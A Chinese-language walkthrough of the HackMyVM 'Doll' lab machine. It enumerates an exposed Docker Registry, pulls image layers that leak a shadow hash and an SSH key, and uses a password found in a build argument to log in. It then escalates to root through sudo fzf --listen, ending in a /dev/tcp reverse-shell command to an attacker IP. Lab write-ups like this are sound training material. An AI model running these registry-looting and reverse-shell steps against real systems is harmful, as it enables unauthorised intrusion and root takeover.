# Doll

2025.03.12 https://hackmyvm.eu/machines/machine.php?vm=Doll

[video]()

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
```

1007 端口显示为 Docker Registry (API: 2.0) ， 目录扫描出 http://192.168.5.39:1007/v2

http://192.168.5.39:1007/v2/_catalog

```json
{
    "repositories": ["dolly"]
}
```

http://192.168.5.39:1007/v2/dolly/tags/list

```json
{
    "name": "dolly",
    "tags": ["latest"]
}
```

http://192.168.5.39:1007/v2/dolly/manifests/latest

```json
{
    "schemaVersion": 1,
    "name": "dolly",
    "tag": "latest",
    "architecture": "amd64",
    "fsLayers": [
        {
            "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
        },
        {
            "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
        },
        {
            "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
        },
        {
            "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
        }
    ],
    "history": [
        {
            "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
        },
        {
            "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}"
        },
        {
            "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
        },
        {
            "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
        }
    ],
    "signatures": [
        {
            "header": {
                "jwk": {
                    "crv": "P-256",
                    "kid": "2Z7Q:7NQ3:Z7YC:AV7H:2ABM:YQSQ:CC6X:XKC7:A7VI:ICWO:GOJW:KTEM",
                    "kty": "EC",
                    "x": "AWecc5ox53LzWanJD3_RuDVBiN4Jo79hSwXsOc6JbaM",
                    "y": "9R6TbMkjhphceMB-8t3dh6cztVX75kpZC7Uaj5gJGg8"
                },
                "alg": "ES256"
            },
            "signature": "DgoqSopZ7nHVd7VMxQeQaMgfCHjJljbRWiPCT32j4Sw4hHtVRvBeSiVqxO6zU2kJnDK-Bg4IE2IZJnNlLw0RTQ",
            "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMy0xMlQwNTo1MzowMloifQ"
        }
    ]
}
```

复制上面每一个 blobSum 到这个 url 后面 , 访问下面 3 个 url 后得到 tar.gz 下载包(手动修改文件后缀名)，解压查看可能存在的敏感信息：

```
(1) http://192.168.5.39:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
(2) http://192.168.5.39:1007/v2/dolly/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
(3) http://192.168.5.39:1007/v2/dolly/blobs/sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
```

也可以使用下面这个脚本进行自动枚举和下载 https://github.com/NotSoSecure/docker_fetch/blob/master/docker_image_fetch.py

其中在第一个下载链接对应的 gz 包中，发现了 /etc/passwd 文件，发现用户名 bela 并且发现 /etc/shadow 文件：

```
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
```

没爆破出来，但是又在这个 gz 包中发现了用户的私钥连接文件 /home/bela/.ssh/id_rsa 私钥有密码，尝试爆破，没结果。

这里没有其他的信息了，在仔细看一下上面返回的 manifests ，这里看到可能是密码 ARG passwd=devilcollectsit 在密钥处输入这个字符串 devilcollectsit，登陆成功。

先拿到了 user flag：

```
bela@doll:~$ cat user.txt
juHDnnGMYNIkVgfnMV
```

sudo -l 显示 `(ALL) NOPASSWD: /usr/bin/fzf --listen\=1337` man 查看帮助 fzf - a command-line fuzzy finder 是一个内容模糊查找提示软件。

尝试执行: `sudo -u root /usr/bin/fzf --listen=1337` 在 127.0.0.1 上会创建一个在 web 上可以执行搜索的服务，在目标机器上使用 curl 发送 execute 命令(fzf --bind "enter:execute(less {})")：

```
curl http://127.0.0.1:1337/ -d 'execute(echo 1 > /tmp/test.txt)'
```

这时发现/tmp 目录中以 root 用户生成了 test.txt 文件，这时就可以执行反弹 shell，获得 root 权限：

```
curl http://127.0.0.1:1337/ -d 'execute(/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1)'
```

拿到了最终的 root flag:

```
root@doll:~# cat root.txt
xwHTSMZljFuJERHmMV
```
